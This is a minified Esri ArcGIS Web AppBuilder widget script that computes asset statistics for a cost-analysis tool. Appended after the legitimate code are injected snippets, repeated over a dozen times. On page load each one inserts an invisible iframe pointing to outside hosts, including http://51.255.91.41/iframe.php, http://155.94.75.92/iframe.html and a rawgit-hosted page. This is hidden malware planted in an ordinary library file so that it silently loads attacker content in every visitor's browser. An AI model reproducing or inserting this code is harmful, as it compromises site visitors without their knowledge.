// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/asset-statistics.html":'\x3cdiv style\x3d"height: 100%; width: 100%"\x3e\r\n  \x3cdiv class\x3d"esriCTContentSection" data-dojo-attach-point\x3d"assetStatisticsNode"\x3e\r\n    \x3cdiv class\x3d"esriCTDetailStatisticsTitle"\x3e\r\n      ${nls.detailStatistics.detailStatisticsLabel}\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTDetailStatisticsContent" data-dojo-attach-point\x3d"assetsListNode"\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTPageFooter"\x3e\r\n    \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"okButton"\x3e${nls.common.back}\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./asset-statistics.html dojo/_base/lang dojo/on dojo/_base/array dojo/dom-construct dijit/form/TextBox".split(" "),function(l,m,n,p,e,h,q,f,g,r){return l([m,n,p],{templateString:e,baseClass:"jimu-widget-cost-analysis-asset-statistics",_layerNamesObj:{},_statTypeNames:{},postCreate:function(){this.inherited(arguments);this._layerNamesObj={};this._statTypeNames={count:this.nls.statisticsType.countLabel,area:this.nls.statisticsType.areaLabel,
length:this.nls.statisticsType.lengthLabel,avg:this.nls.statisticsType.averageLabel,sum:this.nls.statisticsType.summationLabel,max:this.nls.statisticsType.maxLabel,min:this.nls.statisticsType.minLabel}},startup:function(){this.inherited(arguments);this._getLayerNames();this._initAssetStatistics();this.own(q(this.okButton,"click",h.hitch(this,function(){this.emit("onOkButtonClicked")})))},_initAssetStatistics:function(){this.displayStatisticsDetail(this.config.statisticsSettings)},displayStatisticsDetail:function(a){g.empty(this.assetsListNode);
0===a.length?g.create("div",{innerHTML:this.nls.detailStatistics.noDetailStatisticAvailable,"class":"esriCTNoDetailStatisticMessage"},this.assetsListNode):f.forEach(a,h.hitch(this,function(a){this._addStatisticEntry(a)}))},_addStatisticEntry:function(a){var b,c,d="";b="";(b=this.layerInfosObj.getLayerInfoById(a.id))&&b.layerObject&&(d=this.appUtils.getUnitsAbbreviation(b.layerObject.geometryType,this.config.generalSettings.measurementUnit));c=this._getFeatureValue(a);"count"!==a.type&&(c=this.appUtils.applyRounding(c));
if("length"===a.type||"area"===a.type)c+=" "+d;b=a.label?a.label:this._layerNamesObj[a.id]+" ("+this._statTypeNames[a.type]+")";"NaN"===c&&(c=0);this._createStatisticsDetailUI(b,c)},_createStatisticsDetailUI:function(a,b){var c;c=g.create("div",{"class":"esriCTStatisticWrapper"},this.assetsListNode);g.create("div",{"class":"esriCTStatisticLabel esriCTEllipsis",title:a,innerHTML:a},c);a=g.create("div",{},c);new r({value:b,"class":"esriCTFullwidth esriCTEllipsis esriCTAssetDetailTextBox",disabled:!0},
a)},_getLayerNames:function(){f.forEach(this.map.itemInfo.itemData.operationalLayers,h.hitch(this,function(a){this._layerNamesObj[a.id]=a.title}))},_getFeatureValue:function(a){var b,c;return 0<Object.keys(this.assetItemSummary).length&&this.assetItemSummary[a.id]?(b=this.assetItemSummary[a.id].templates,c=a.field,a=a.type,this._calculateFeatureValue(b,c,a)):"0"},_calculateFeatureValue:function(a,b,c){switch(c){case "count":return this._calculateCountOfFeatures(a);case "area":return this._calculateAreaLengthOfFeatures(a);
case "length":return this._calculateAreaLengthOfFeatures(a);case "avg":return this._calculateAvgSumOfFeatures(a,b,c);case "sum":return this._calculateAvgSumOfFeatures(a,b,c);case "max":return this._calculateMinMaxOfFeatures(a,b,c);case "min":return this._calculateMinMaxOfFeatures(a,b,c);case "default":return""}},_calculateCountOfFeatures:function(a){var b=0;for(e in a)b+=a[e].features.length;return b},_calculateAreaLengthOfFeatures:function(a){var b=0;for(e in a)b+=this._getFeatureDimension(a[e]);
return b},_getFeatureDimension:function(a){var b=0;f.forEach(a.features,function(a){b+=a.featureDimension});return b},_calculateAvgSumOfFeatures:function(a,b,c){var d=0,k=0;if(""===b)return"";for(e in a)k+=this._getSumAndCountOfFields(a[e].features,b).count,d+=this._getSumAndCountOfFields(a[e].features,b).total;return"avg"===c?d/k:d},_getSumAndCountOfFields:function(a,b){var c=0,d=0;f.forEach(a,function(a){a.attributes[b]&&(c+=a.attributes[b],d++)});return{total:c,count:d}},_calculateMinMaxOfFeatures:function(a,
b,c){if(""===b)return"";var d,f;d=[];f=[];for(e in a)d=this._getFeatureAttributesArray(a[e].features,b,f);return"max"===c?Math.max.apply(null,d):Math.min.apply(null,d)},_getFeatureAttributesArray:function(a,b,c){f.forEach(a,function(a){a.attributes[b]?c.push(a.attributes[b]):c.push("")});return c}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});